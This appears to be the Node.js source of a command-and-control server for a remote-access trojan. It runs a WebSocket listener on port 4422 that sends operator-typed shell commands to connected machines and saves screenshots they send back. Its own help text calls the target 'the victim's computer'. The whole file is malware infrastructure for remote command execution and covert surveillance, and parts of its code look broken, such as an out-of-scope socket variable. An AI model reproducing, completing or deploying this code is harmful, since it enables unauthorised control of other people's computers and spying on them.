const WebSocket = require('ws');
const readline = require('readline');
const detectCharacterEncoding = require('detect-character-encoding');
var next = "";
var rl;

const wss = new WebSocket.Server({
  port: 4422
});

wss.on('connection', function connection(ws) {
  console.log("Connected !");
  ws.on('message', function incoming(message) {
    //console.log(message);
    if (message.split(" ")[0] == "help") {
      if (inCmdArr.indexOf(message.split(" ")[1]) > -1) {
        console.log(inCmdArrDesc[message.split(' ')[1]]);
      } else {
        console.log("unknown command");
      }

    } else if (message == "help") {
      console.log(inCmdArrDesc['help']);
    } else if (next == "screenshot") {
      next = "";
      var base64Data = message.replace(/^data:image\/png;base64,/, "");

      require("fs").writeFile("screenshots/" + Date.now() + ".png", base64Data, 'base64', function (err) {
        console.log(err);
      });
    } else if (message.startsWith("hello")) {
      var workingDir = message.substring(message.indexOf("##") + 2, message.lastIndexOf("##"));
      shell(workingDir);
    } else if (message.startsWith("##finish##")) {
      ws.send("#pwd")
    } else if (message == "##SCREENSHOT##") {
      next = "screenshot";
    } else {
      console.log(message);
    }

  });

  ws.on('close', function (reasonCode, description) {
    console.log((new Date()) + ' Peer ' + ws.remoteAddress + ' disconnected.');
    cmdClose();
  });


});

function cmdClose() {
  rl.close();
}

function shell(workingDir) {
  rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });
  rl.question(workingDir + ">", (answer) => {
    ws.send(answer);
    rl.close();
  });
}

var inCmdArr = ["help"];
var inCmdArrDesc = {
  "help": "Show this message. Usage : help [command name] or help",
  "screenshot": "takes a screenshot of the victim's computer. The screenshots are in the screenshots/ folder."
}